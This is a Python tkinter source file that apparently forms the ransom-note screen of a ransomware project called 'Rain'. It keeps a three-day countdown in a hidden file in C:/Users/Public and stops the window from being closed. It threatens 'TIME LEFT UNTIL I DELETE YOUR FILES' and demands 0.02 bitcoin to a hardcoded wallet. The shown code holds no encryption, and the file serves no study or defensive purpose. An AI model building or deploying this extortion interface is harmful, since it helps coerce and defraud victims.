import tkinter as tk
from tkinter import messagebox
import datetime
from os import path,system

class RainGui():
	def __init__(self):
		self.countdown = 259200

		if(path.exists('C:/Users/Public/.hours')==True):
			with open('C:/Users/Public/.hours','r') as f:
				self.countdown = int(f.read())
		else:
			with open('C:/Users/Public/.hours','w') as f:
				f.write(str(self.countdown))

		self.main = tk.Tk()
		self.main.protocol('WM_DELETE_WINDOW',self.Close_Window)
		self.main.geometry('700x450')
		self.main.title('')
		self.main.resizable(0,0)
		self.main.iconbitmap(r'C:\Users\guilh\Downloads\RainRansomware-master\Files\rainicon.ico')
		self.CreateWidgets()
		self.main.mainloop()

	def Close_Window(self):
		messagebox.showerror('','')

	def CreateWidgets(self):
		self.now = tk.StringVar()
		self.wall = tk.StringVar()
		self.framemain = tk.Frame(self.main)
		self.framemainlabel = tk.Frame(self.framemain,bg='black')
		self.frametime = tk.Frame(self.framemain,bg='grey')
		self.frametiming = tk.Frame(self.frametime,bg='red')

		self.rainmain = tk.Label(self.framemainlabel,text="RAIN",bg='black',font=('Doctor Glitch',60),justify=tk.LEFT,fg='white')
		self.timeto = tk.Label(self.frametime,text="TIME LEFT UNTIL I DELETE YOUR FILES",bg='grey',font=('Trebuchet MS',30),anchor=tk.NW)
		self.time = tk.Label(self.frametime,text=self.now,bg='red',font=('Alarm Clock',80))
		self.payto = tk.Label(self.frametime,text="TRANSFER 0.02 BITCOIN TO THIS VIRTUAL WALLET.",bg='grey',font=('Trebuchet MS',20),anchor=tk.NW)
		self.dontmakemewait = tk.Label(self.frametime,text="DON'T MAKE ME WAIT.",bg='grey',font=('Trebuchet MS',40),anchor=tk.NW)

		self.framemain.place(relwidth=1,relheight=1)
		self.frametime.place(relwidth=1,relheight=0.8,rely=0.2)
		self.framemainlabel.place(relwidth=1,relheight=0.2)
		self.frametiming.place()

		self.wallet = tk.Text(self.frametime,height=1,width=37,font=('Trebuchet MS',20))
		self.wallet.insert(tk.END,"1F1tAaz5x1HUXrCNLbtMDqcw6o5GNn4xqX")
		self.wallet.config(state='disabled')

		self.rainmain.pack()
		self.timeto.pack()
		self.time.pack()
		self.payto.pack()
		self.dontmakemewait.pack()
		self.wallet.pack()

		self.Counting()

	def Counting(self):
		if self.countdown>=0:
			t=datetime.timedelta(seconds=self.countdown)
			seconds = t.total_seconds()
			self.hours = seconds//3600
			self.minutes = (seconds % 3600) // 60
			self.seconds = seconds%60
			t = '{}:{}:{}'.format(int(self.hours),int(self.minutes),int(self.seconds))
			if t!='':
				self.time.config(text=t)
				self.countdown=self.countdown-1
			self.main.after(1000,self.Counting)
			self.SaveState()

	def SaveState(self):
		self.f = open('C:/Users/Public/.hours','w')
		self.f.write(str((int(self.hours))*3600+(int(self.minutes))*60+int(self.seconds)))
		self.f.close()